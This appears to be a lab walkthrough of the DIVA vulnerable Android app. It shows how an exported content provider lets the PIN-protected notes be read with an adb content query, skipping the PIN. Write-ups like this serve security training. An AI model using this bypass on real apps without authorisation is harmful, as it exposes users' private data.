## Access Control Part 3

This is a activity acts as a private notes application which stores tge following notes. This application is protected by a 

pin set by the user.

![whats the pin?](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%203/Screenshot%20from%202019-10-18%2015-05-36.png)

So how to get the notes without knowing the pin of the user?

#### The vulnerability

Based on the source code below, if the user pin is correct, it sends a query to a content provider to retrieve the notes of 
the person 

        if (userpin.equals(pin)) {
            // Display the private notes
            ListView  lview = (ListView) findViewById(R.id.aci3nlistView);
            Cursor cr = getContentResolver().query(NotesProvider.CONTENT_URI, new String[] {"_id", "title", "note"}, null, null, null);
            String[] columns = {NotesProvider.C_TITLE, NotesProvider.C_NOTE};
            
            
But its not stated what the uri is being queried. Where can the uri be found then?


#### The exploit


Lets check the manifest file of the app.

        <provider
            android:name=".NotesProvider"
            android:authorities="jakhar.aseem.diva.provider.notesprovider"
            android:enabled="true"
            android:exported="true" >
        </provider>

Not really what we wanted. Lets try the values folder within the resources folder and see if the content uri is being hardcoded
inside that folder

navigate to the values folder then type:

        cat * | grep content://

![uri](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%203/Screenshot%20from%202019-10-18%2015-31-20.png)

Yayyyyy we got it!

Thats probably the content uri of the notes!

Lets try querying that uri

#### The exploit

To query the uri, type this command in the terminal


        adb shell content query --uri content://jakhar.aseem.diva.provider.notesproviders/notes
        
![notes](https://github.com/Blahblahlolhahaha/Diva-walkthrough/blob/master/Access%20Control/Part%203/Screenshot%20from%202019-10-18%2015-33-31.png)

Got it!
